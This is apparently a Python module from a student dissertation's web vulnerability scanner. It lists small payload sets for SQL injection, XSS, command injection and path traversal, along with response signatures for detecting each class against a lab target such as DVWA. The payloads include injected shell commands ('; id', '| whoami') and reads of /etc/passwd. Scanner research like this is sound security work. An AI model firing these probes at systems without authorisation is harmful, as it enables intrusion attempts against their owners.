"""
Payload sets and detection signatures, one entry per vuln class.

Deliberately small and named rather than a generic fuzzing wordlist —
every payload here should be individually justifiable in a dissertation
methodology section.
"""

from __future__ import annotations

from models import VulnClass

# --- Payloads ---

PAYLOADS: dict[VulnClass, list[str]] = {
    VulnClass.SQLI: [
        "' OR '1'='1",
        "' OR SLEEP(2)-- -",
        "1' AND '1'='2",
    ],
    VulnClass.XSS: [
        "<script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
    ],
    VulnClass.CMDI: [
        "; id",
        "| whoami",
        "`id`",
    ],
    VulnClass.PATH_TRAVERSAL: [
        "../../../../etc/passwd",
        "....//....//....//....//etc/passwd",
    ],
}

# --- Detection signatures ---

SQL_ERROR_STRINGS = [
    "sql syntax",
    "mysql_fetch",
    "you have an error in your sql syntax",
    "warning: mysql",
]

PATH_TRAVERSAL_MARKERS = [
    "root:",
    "/bin/bash",
    "/bin/sh",
]

# Generic "your input was rejected" pages some apps show (DVWA's naive
# input filter included). These cause a big response-length change from
# baseline that looks exactly like a boolean-SQLi signal, but reflect the
# app blocking the request outright — not the query behaving differently.
BLOCK_PAGE_INDICATORS = [
    "hacking attempt detected",
    "attack detected",
    "request blocked",
    "forbidden",
]

CMDI_MARKERS = [
    "uid=",
    "gid=",
]

# Payloads whose detection relies on response timing rather than content
TIMING_BASED_PAYLOADS = {"' OR SLEEP(2)-- -"}
TIMING_THRESHOLD_MS = 1800  # comfortably below the 2000ms SLEEP, above normal latency

# Payloads that are syntactically valid SQL (no error expected) and rely
# instead on changing which rows the query returns — the boolean-based
# SQLi class. Flagged via response-length deviation from baseline, not
# error strings. This is a weaker, content-diff-based signal by nature.
BOOLEAN_SQLI_INDICATORS = {"' OR '1'='1", "1' AND '1'='2"}